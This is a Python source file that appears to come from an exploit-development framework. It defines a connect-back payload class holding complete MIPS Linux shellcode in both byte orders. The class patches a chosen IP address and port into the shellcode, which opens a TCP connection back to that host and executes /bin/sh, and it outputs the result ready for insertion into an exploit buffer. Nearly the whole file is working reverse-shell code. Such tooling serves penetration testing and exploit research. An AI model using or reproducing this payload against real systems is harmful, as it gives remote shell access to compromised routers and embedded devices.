# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
# - Tactical Network Solutions, LLC
# 
# See LICENSE.txt for more details.
# 

import string
import socket
import signal
import os
from collections import OrderedDict
from ...common.support import BigEndian,LittleEndian

class ConnectbackPayload:
    """
    This is a MIPS Linux connect-back payload.
    
    It will establish a TCP connection to the specified port and address,
    and exec() a shell with the privileges of the exploited process.
    """
    shellcodes = {}
    shellcodes[LittleEndian]=string.join([
        "\xfa\xff\x0f\x24", # li    t7,-6
        "\x27\x78\xe0\x01", # nor   t7,t7,zero
        "\xfd\xff\xe4\x21", # addi  a0,t7,-3
        "\xfd\xff\xe5\x21", # addi  a1,t7,-3
        "\xff\xff\x06\x28", # slti  a2,zero,-1
        "\x57\x10\x02\x24", # li    v0,4183
        "\x0c\x01\x01\x01", # syscall   0x40404
        "\xff\xff\xa2\xaf", # sw    v0,-1(sp)
        "\xff\xff\xa4\x8f", # lw    a0,-1(sp)
        "\xfd\xff\x0f\x3c", # lui   t7,0xfffd
        "\x27\x78\xe0\x01", # nor   t7,t7,zero
        "\xe0\xff\xaf\xaf", # sw    t7,-32(sp)
        "PORT1PORT2\x0e\x3c", # lui t6,0x901f
        "PORT1PORT2\xce\x35", # ori t6,t6,0x901f
        "\xe4\xff\xae\xaf", # sw    t6,-28(sp)

        "IP2IP3\x0e\x3c",   # lui       t6,<ip>
        "IP0IP1\xce\x35",   # ori       t6,t6,<ip>

        "\xe6\xff\xae\xaf", # sw    t6,-26(sp)
        "\xe2\xff\xa5\x27", # addiu a1,sp,-30
        "\xef\xff\x0c\x24", # li    t4,-17
        "\x27\x30\x80\x01", # nor   a2,t4,zero
        "\x4a\x10\x02\x24", # li    v0,4170
        "\x0c\x01\x01\x01", # syscall   0x40404
        "\xfd\xff\x0f\x24", # li    t7,-3
        "\x27\x78\xe0\x01", # nor   t7,t7,zero
        "\xff\xff\xa4\x8f", # lw    a0,-1(sp)
        "\x21\x28\xe0\x01", # move  a1,t7
        "\xdf\x0f\x02\x24", # li    v0,4063
        "\x0c\x01\x01\x01", # syscall   0x40404
        "\xff\xff\x10\x24", # li    s0,-1
        "\xff\xff\xef\x21", # addi  t7,t7,-1
        "\xfa\xff\xf0\x15", # bne   t7,s0,68 <dup2_loop>
        "\xff\xff\x06\x28", # slti  a2,zero,-1
        "\x62\x69\x0f\x3c", # lui   t7,0x6962
        "\x2f\x2f\xef\x35", # ori   t7,t7,0x2f2f
        "\xec\xff\xaf\xaf", # sw    t7,-20(sp)
        "\x73\x68\x0e\x3c", # lui   t6,0x6873
        "\x6e\x2f\xce\x35", # ori   t6,t6,0x2f6e
        "\xf0\xff\xae\xaf", # sw    t6,-16(sp)
        "\xf4\xff\xa0\xaf", # sw    zero,-12(sp)
        "\xec\xff\xa4\x27", # addiu a0,sp,-20
        "\xf8\xff\xa4\xaf", # sw    a0,-8(sp)
        "\xfc\xff\xa0\xaf", # sw    zero,-4(sp)
        "\xf8\xff\xa5\x27", # addiu a1,sp,-8
        "\xab\x0f\x02\x24", # li    v0,4011
        "\x0c\x01\x01\x01"  # syscall   0x40404
        ], '')

    shellcodes[BigEndian]=string.join([
        "\x24\x0f\xff\xfa", # li    t7,-6
        "\x01\xe0\x78\x27", # nor   t7,t7,zero
        "\x21\xe4\xff\xfd", # addi  a0,t7,-3
        "\x21\xe5\xff\xfd", # addi  a1,t7,-3
        "\x28\x06\xff\xff", # slti  a2,zero,-1
        "\x24\x02\x10\x57", # li    v0,4183
        "\x01\x01\x01\x0c", # syscall   0x40404
        "\xaf\xa2\xff\xfc", # sw    v0,-4(sp)
        "\x8f\xa4\xff\xfc", # lw    a0,-4(sp)
        "\x34\x0f\xff\xfd", # li    t7,0xfffd
        "\x01\xe0\x78\x27", # nor   t7,t7,zero
        "\xaf\xaf\xff\xe0", # sw    t7,-32(sp)

        "\x3c\x0ePORT1PORT2", # lui t6,0x1f91
        "\x35\xcePORT1PORT2", # ori t6,t6,0x1f91

        "\xaf\xae\xff\xe4", # sw    t6,-28(sp)

        "\x24\x0eIP0IP1", # li  t6,258
        "\x24\x0dIP2IP3", # li  t5,772

        "\xa7\xae\xff\xe6", # sh    t6,-26(sp)
        "\xa7\xad\xff\xe8", # sh    t5,-24(sp)
        "\x27\xa5\xff\xe2", # addiu a1,sp,-30
        "\x24\x0c\xff\xef", # li    t4,-17
        "\x01\x80\x30\x27", # nor   a2,t4,zero
        "\x24\x02\x10\x4a", # li    v0,4170
        "\x01\x01\x01\x0c", # syscall   0x40404
        "\x24\x0f\xff\xfd", # li    t7,-3
        "\x01\xe0\x78\x27", # nor   t7,t7,zero
        "\x8f\xa4\xff\xfc", # lw    a0,-4(sp)
        "\x01\xe0\x28\x21", # move  a1,t7
        "\x24\x02\x0f\xdf", # li    v0,4063
        "\x01\x01\x01\x0c", # syscall   0x40404
        "\x24\x10\xff\xff", # li    s0,-1
        "\x21\xef\xff\xff", # addi  t7,t7,-1
        "\x15\xf0\xff\xfa", # bne   t7,s0,6c <dup2_loop>
        "\x28\x06\xff\xff", # slti  a2,zero,-1
        "\x3c\x0f\x2f\x2f", # lui   t7,0x2f2f
        "\x35\xef\x62\x69", # ori   t7,t7,0x6269
        "\xaf\xaf\xff\xec", # sw    t7,-20(sp)
        "\x3c\x0e\x6e\x2f", # lui   t6,0x6e2f
        "\x35\xce\x73\x68", # ori   t6,t6,0x7368
        "\xaf\xae\xff\xf0", # sw    t6,-16(sp)
        "\xaf\xa0\xff\xf4", # sw    zero,-12(sp)
        "\x27\xa4\xff\xec", # addiu a0,sp,-20
        "\xaf\xa4\xff\xf8", # sw    a0,-8(sp)
        "\xaf\xa0\xff\xfc", # sw    zero,-4(sp)
        "\x27\xa5\xff\xf8", # addiu a1,sp,-8
        "\x24\x02\x0f\xab", # li    v0,4011
        "\x01\x01\x01\x0c"  # syscall   0x40404
        ],'')

    def __init__(self,connectback_ip,endianness,port=8080):
        """
        Class constructor.
        
        Parameters:
        -----------
        connectback_ip: IP Address to connect back to.
        endianness: Endianness of the target. one of LittleEndian or BigEndian,
                    (imported from bowcaster.common.support).
        port:   Optional parameter specifying TCP port to connect back to.
                Defaults to 8080.
                
        Attributes:
        -----------
        shellcode:  The string representing the payload's shellcode, ready to add
                    to an exploit buffer.
        endianness: The endianness of this payload object.
        
        Notes:
        ------
        Although this payload is free of common bad characters such as nul bytes
        and spaces, your IP address or port may introduce bad characters.  If so,
        you may need to use an encoder.
        """
        
        self.endianness=endianness        
        port=int(port)

        shellcode=self.__class__.shellcodes[endianness]
        i = 0
        for c in socket.inet_aton(connectback_ip):
            shellcode = shellcode.replace("IP%d" % i, c)
            i+=1

        shellcode = shellcode.replace("PORT1",chr(port >> 8))
        shellcode = shellcode.replace("PORT2",chr(port & 0xFF))

        self.shellcode=shellcode
        
        self.details=details=OrderedDict()
        self.description="TCP connect-back shell. Target address & port=%s:%s" % (connectback_ip,str(port))
        details["description"]=self.description
        details["connectback_ip"]=connectback_ip
        details["port"]=str(port)
        
    @classmethod
    def reconstitute(cls,details):
        connectback_ip=details["connectback_ip"]
        endianness=details["endianness"]
        port=details["port"]
        
        return cls(connectback_ip,endianness,port=port)

